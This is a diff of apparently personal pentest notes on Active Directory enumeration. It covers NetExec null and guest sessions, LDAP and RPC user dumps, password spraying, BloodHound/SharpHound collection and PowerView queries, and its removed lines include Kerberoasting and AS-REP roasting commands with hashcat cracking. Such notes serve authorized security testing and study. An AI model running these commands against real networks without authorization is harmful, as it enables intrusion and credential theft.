@@ -1,9 +1,4 @@
-# Active Directory Enumeration
-
-## List Domain Users
-```
-net user /domain
-```
+# Enumerate without Credentials
 
 ## Test SMB anonymous access with NetExec
 ```bash
@@ -11,10 +6,11 @@ net user /domain
 netexec smb $IP -u '' -p '' --shares
 ```
 
-## Test LDAP anonymous access with NetExec
+## Check LDAP Guest and anonymous access (NetExec)
 ```bash
 # -u '' for null session OR -u 'guest' for guest account
 netexec ldap $IP -u '' -p '' --users --groups
+netexec ldap $IP -u 'Guest' -p '' --users --groups
 ```
 
 ## Test WinRM/RDP anonymous access with NetExec
@@ -28,7 +24,6 @@ netexec winrm $IP -u '' -p ''
 # Add filter like "(objectClass=*)" for all objects
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local"
 ```
-
 ## Extract user accounts from LDAP
 ```bash
 ldapsearch -x -H ldap://$IP -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort > users.txt
@@ -76,15 +71,10 @@ rpcclient -U "" -N $IP -c "enumdomgroups"
 rpcclient -U "" -N $IP -c "querydominfo"
 ```
 
-## Identify domain controllers with nmap
-```bash
-nmap -p 88,389,636,3268,3269 $IP
-```
-
 ## Reverse DNS lookup for domain name
+Include @$DC to specify $DC as the DNS server to make the query at.
 ```bash
-# nslookup OR dig -x
-nslookup $IP
+dig -x $IP
 ```
 
 ## NetBIOS name discovery
@@ -111,33 +101,18 @@ netexec smb $IP -u username -p password --shares
 # Change protocol: smb, ldap, OR winrm
 netexec smb $IP -u users.txt -p passwords.txt --continue-on-success
 ```
-
-## ASREPRoast attack without credentials
-```bash
-# Add -format hashcat for hashcat-compatible output
-impacket-GetNPUsers domain.local/ -dc-ip $IP -no-pass -usersfile users.txt
-```
-
-## Hashcat ASREPRoast
-```bash
-hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
-```
-
-## Kerberoast attack with credentials
-```bash
-# impacket: add -outputfile kerb_hashes.txt OR netexec for automation
-impacket-GetUserSPNs domain.local/username:password -dc-ip $IP -request
-```
-
-## Crack Kerberoast hashes with hashcat
-```bash
-hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt
-```
+## [[88 Kerberos#AS-REP Roasting|Asreproast]]
+## [[88 Kerberos#Kerberoasting|Kerberoast]]
 
 ## Collect BloodHound data with Netexec
 ```bash
 # $IP must be a domain controller
 nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
+```
+
+## SharpHound (GitHub Source)
+```
+https://github.com/SpecterOps/SharpHound
 ```
 
 ## SharpHound (Kali Source)
@@ -147,45 +122,41 @@ nxc ldap $IP -u $USER -p $PASS --bloodhound --collection All
 
 ## Run SharpHound on Windows target
 ```cmd
-# Add -d domain.local OR --zipfilename output.zip as needed
-.\SharpHound.exe -c All
+.\SharpHound.exe -c All -d domain.local --zipfilename bloodhound.zip
 ```
 
 ## PowerView.ps1 (Source)
+PowerShell module with commands similar to the official Active Directory module. Dot source (`. .\PowerView.ps1`) to use its functions.
 ```
 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 ```
 
-## Get domain information with PowerView
+## Get domain information (PowerView)
 ```powershell
 Get-Domain
 Get-DomainController
 Get-DomainPolicy
 ```
 
-## Enumerate domain users with PowerView
+## Enumerate domain users (PowerView)
 ```powershell
+# Example: Get-DomainUser -Identity administrator | Select-Object samaccountname,description
 Get-DomainUser
-Get-DomainUser -Identity administrator
-Get-DomainUser | Select-Object samaccountname,description
 ```
 
-## Enumerate domain groups with PowerView
+## Enumerate domain groups  (PowerView)
 ```powershell
+# Example: Get-DomainGroup -Identity "Domain Admins"
 Get-DomainGroup
-Get-DomainGroup -Identity "Domain Admins"
-Get-DomainGroupMember -Identity "Domain Admins"
 ```
 
-## Enumerate domain computers with PowerView
+## Enumerate domain computers (PowerView)
 ```powershell
 Get-DomainComputer
-Get-DomainComputer | Select-Object name,operatingsystem
 ```
 
-## Find domain shares with PowerView
+## Find domain shares (PowerView)
 ```powershell
-Find-DomainShare
 Find-DomainShare -CheckShareAccess
 ```
 
